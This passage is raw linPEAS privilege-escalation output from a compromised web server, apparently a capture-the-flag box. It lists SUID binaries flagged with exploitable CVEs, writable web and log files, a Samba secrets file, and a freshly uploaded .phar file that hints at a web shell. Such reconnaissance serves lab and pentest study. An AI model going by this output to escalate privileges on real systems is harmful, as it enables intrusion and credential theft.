	dns_lookup_realm = false
	dns_lookup_kdc = true
tickets kerberos Not Found
klist Not Found



\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching AD cached hashes
-rw------- 1 root root 430080 May 28  2021 /var/lib/samba/private/secrets.tdb

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching tmux sessions
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux 2.1


/tmp/tmux-33
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 May 28  2021 /usr/share/keyrings
drwxr-xr-x 2 root root 4096 May 28  2021 /var/lib/apt/keyrings




\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Backup Manager Files (limit 70)
-rwxr-xr-x 1 www-data www-data 7756 Jun 14  2018 /var/www/html/subrion/includes/api/storage.php
        $member = $this->_iaDb->row(['password'], iaDb::convertIds($client_id, 'username'), $iaUsers::getTable());
        return ($member && $member['password'] == $iaUsers->encodePassword($client_secret));

-rwxr-xr-x 1 www-data www-data 19901 Jun 14  2018 /var/www/html/subrion/admin/database.php
    protected $_name = 'database';
-rwxr-xr-x 1 www-data www-data 3805 May 29  2021 /var/www/html/wordpress/wp-content/plugins/redirection/database/database.php

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 13996 Aug 10  2020 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 364 May 28  2021 /etc/apt/trusted.gpg.d/ondrej_ubuntu_php.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 0 Nov 12  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 2294 Nov 12  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 2253 Nov  6  2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Nov  6  2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 27  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Aug 10  2020 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg



\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing FTP Files (limit 70)


-rw-r--r-- 1 root root 69 May  1  2021 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 May  1  2021 /usr/share/php7.2-common/common/ftp.ini






\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Interesting logs Files (limit 70)

-rw-r--r-- 1 www-data www-data 0 Apr 17 09:30 /var/www/html/subrion/uploads/error.log

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 22 May 28  2021 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 May 28  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 May 28  2021 /var/lib/dpkg/alternatives/my.cnf



























\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Sep  1  2015 /etc/skel/.bashrc
-rw-r--r-- 1 scamsite scamsite 3771 May 28  2021 /home/scamsite/.bashrc





-rw-r--r-- 1 root root 655 Jul 13  2019 /etc/skel/.profile
-rw-r--r-- 1 scamsite scamsite 655 May 28  2021 /home/scamsite/.profile



-rw-r--r-- 1 scamsite scamsite 0 May 28  2021 /home/scamsite/.sudo_as_admin_successful



                                         \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Interesting Files \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                                         \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 SUID - Check easy privesc, exploits and write perms
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K Mar 27  2019 /bin/su
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 33K Mar 27  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 71K Mar 27  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 27  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K Mar 27  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K Mar 27  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 51K Jan 15  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 134K Feb  1  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 74K Mar 27  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 33K Mar 27  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K May 27  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 83K Apr 10  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 109K Jul 11  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 35K Mar  6  2017 /sbin/mount.cifs

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 SGID
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root crontab 36K Apr  6  2016 /usr/bin/crontab
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 61K Mar 27  2019 /usr/bin/chage
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwxr-sr-x 1 root ssh 351K May 27  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Mar 27  2019 /usr/bin/expiry
-rwsr-sr-x 1 daemon daemon 51K Jan 15  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/unix_chkpwd

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking misconfigurations of ld.so
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Capabilities
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Files with ACLs (limited to 50)
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
files with acls in searched folders Not Found

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 .sh files in path
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Unexpected in root
/vmlinuz
/vmlinuz.old
/initrd.img
/initrd.img.old

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Files (scripts) in /etc/profile.d/
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
total 24
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21 11:31 ..
-rw-r--r--  1 root root 1557 Apr 15  2016 Z97-byobu.sh
-rw-r--r--  1 root root  825 Jul 11  2020 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Permissions in init, init.d, systemd, and rc.d
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d

\u2550\u2563 Hashes inside passwd file? ........... No
\u2550\u2563 Writable passwd file? ................ No
\u2550\u2563 Credentials in fstab/mtab? ........... No
\u2550\u2563 Can I read shadow files? ............. No
\u2550\u2563 Can I read shadow plists? ............ No
\u2550\u2563 Can I write shadow plists? ........... No
\u2550\u2563 Can I read opasswd file? ............. No
\u2550\u2563 Can I write in network-scripts? ...... No
\u2550\u2563 Can I read root folder? .............. No

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching root files in home dirs (limit 30)
/home/
/home/scamsite/websvr
/home/scamsite/websvr/enter.txt
/root/

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching folders owned by me containing others files on it (limit 100)
/var/www/html/test

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Readable files belonging to root and readable by me but not world readable

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Modified interesting files in the last 5mins (limit 100)
/var/www/html/subrion/uploads/yixfrywmyikvwmk.phar
/var/log/auth.log
/var/log/syslog
/var/log/kern.log

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Writable log files (logrotten) (limit 100)
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
Writable: /var/www/html/subrion/uploads/error.log
Writable: /var/www/html/subrion/includes/classes/ia.core.log.php

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Files inside /home/www-data (limit 20)

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Files inside others home (limit 20)
/home/scamsite/.bash_logout
/home/scamsite/.bashrc
/home/scamsite/.bash_history
/home/scamsite/.profile
/home/scamsite/websvr/enter.txt
/home/scamsite/.sudo_as_admin_successful

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching installed mail applications

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Mails (limit 50)

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Backup folders

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Backup files (limited 100)
-rw-r--r-- 1 root root 1332 Jul 15  2020 /etc/apache2/sites-available/000-default.conf.bak
-rw-r--r-- 1 root root 673 May 28  2021 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 May 28  2021 /etc/xml/catalog.old
-rwxr-xr-x 1 www-data www-data 6663 Jun 14  2018 /var/www/html/subrion/install/classes/ia.backup.php
-rwxr-xr-x 1 www-data www-data 3144 Jun 14  2018 /var/www/html/subrion/install/templates/upgrade.backup.tpl
-rw-r--r-- 1 root root 128 May 28  2021 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 9078 Jul  1  2020 /lib/modules/4.4.0-186-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9038 Jul  1  2020 /lib/modules/4.4.0-186-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 0 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 191098 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/.config.old
-rwxr-xr-x 1 root root 10504 Mar 14  2016 /usr/bin/tdbbackup.tdbtools
-rwxr-xr-x 1 root root 226 Apr 15  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 10542 May 28  2021 /usr/share/info/dir.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 1624 Mar 14  2016 /usr/share/man/man8/tdbbackup.tdbtools.8.gz
-rw-r--r-- 1 root root 1496 May 28  2021 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-35.pyc
-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 35792 May  9  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K May 28  2021 .
drwxr-xr-x 14 root root 4.0K May 28  2021 ..
drwxr-xr-x  5 root root 4.0K May 29  2021 html

/var/www/html:
total 36K
drwxr-xr-x  5 root     root     4.0K May 29  2021 .
drwxr-xr-x  3 root     root     4.0K May 28  2021 ..

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Apr 17 08:21 /run/network/.ifstate.lock
-rw------- 1 root root 0 Aug 10  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 1391 May 28  2021 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Sep  1  2015 /etc/skel/.bash_logout
-rw-r--r-- 1 scamsite scamsite 220 May 28  2021 /home/scamsite/.bash_logout
-rwxr-xr-x 1 www-data www-data 629 May  9  2016 /var/www/html/wordpress/wp-content/plugins/akismet/.htaccess
-rwxr-xr-x 1 www-data www-data 89 Nov 13  2020 /var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintignore
-rwxr-xr-x 1 www-data www-data 688 Feb 19  2021 /var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintrc-css.json
-rwxr-xr-x 1 www-data www-data 356 Nov 13  2020 /var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintrc.json
-rwxr-xr-x 1 www-data www-data 269 Oct 26  2019 /var/www/html/wordpress/wp-content/themes/twentytwenty/.stylelintrc.json
-rw-r--r-- 1 www-data www-data 543 May 29  2021 /var/www/html/wordpress/.htaccess
-rwxr-xr-x 1 www-data www-data 656 Jun 14  2018 /var/www/html/subrion/uploads/.htaccess
-rwxr-xr-x 1 www-data www-data 13 Jun 14  2018 /var/www/html/subrion/updates/.htaccess
-rwxr-xr-x 1 www-data www-data 14 Jun 14  2018 /var/www/html/subrion/tmp/.htaccess
-rwxr-xr-x 1 www-data www-data 274 Jun 14  2018 /var/www/html/subrion/install/.htaccess
-rwxr-xr-x 1 www-data www-data 28 Jun 14  2018 /var/www/html/subrion/admin/templates/emails/.babelrc
-rwxr-xr-x 1 www-data www-data 13 Jun 14  2018 /var/www/html/subrion/templates/kickstart/less/.htaccess
-rwxr-xr-x 1 www-data www-data 2318 Jun 14  2018 /var/www/html/subrion/.htaccess
-rwxr-xr-x 1 www-data www-data 14 Jun 14  2018 /var/www/html/subrion/backup/.htaccess

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 8967 May 29  2021 /var/backups/apt.extended_states.0
-rwxr-xr-x 1 www-data www-data 14 Jun 14  2018 /var/www/html/subrion/backup/.htaccess

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/run/lock
/run/lock/apache2
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-TechSupportx2dvg-swap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2dnamex2dTechSupportx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2duuidx2dLVMx2deON0lfHKy4V2tgYESO8hwNXZWtBlDHcOuIsF045B64yAhkEK3sm98uNhb5q0LoB2.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-aa903007x2d9d22x2d426dx2d837bx2d9f0a5724786a.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-dmx2d1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-TechSupportx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/samba-ad-dc.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/smbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-systemdx2dfsck.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/winbind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/spool/samba
/var/tmp
/var/www/html/subrion
/var/www/html/subrion/.gitignore
/var/www/html/subrion/.htaccess
/var/www/html/subrion/CONTRIBUTING.md
/var/www/html/subrion/README.md
/var/www/html/subrion/admin
/var/www/html/subrion/admin/actions.php
/var/www/html/subrion/admin/adminer.php
/var/www/html/subrion/admin/blocks.php
/var/www/html/subrion/admin/configuration.php
/var/www/html/subrion/admin/currencies.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default
/var/www/html/subrion/admin/templates/default/.gitignore
/var/www/html/subrion/admin/templates/default/Gulpfile.js
/var/www/html/subrion/admin/templates/default/blocks.tpl
/var/www/html/subrion/admin/templates/default/breadcrumb.tpl
/var/www/html/subrion/admin/templates/default/buttons.tpl
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/css/bootstrap-calmy.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-darkness.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-default.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-gebeus-waterfall.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-radiant-orchid.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/currencies.tpl
/var/www/html/subrion/admin/templates/default/custom-config.tpl
/var/www/html/subrion/admin/templates/default/database.tpl
/var/www/html/subrion/admin/templates/default/email-templates.tpl
/var/www/html/subrion/admin/templates/default/error.tpl
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/fonts/FontAwesome.otf
/var/www/html/subrion/admin/templates/default/fonts/Subrion.ttf
/var/www/html/subrion/admin/templates/default/fonts/Subrion.woff
/var/www/html/subrion/admin/templates/default/fonts/fontawesome-webfont.eot
/var/www/html/subrion/admin/templates/default/fonts/fontawesome-webfont.ttf
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/goto.tpl
/var/www/html/subrion/admin/templates/default/grid.tpl
/var/www/html/subrion/admin/templates/default/hooks.tpl
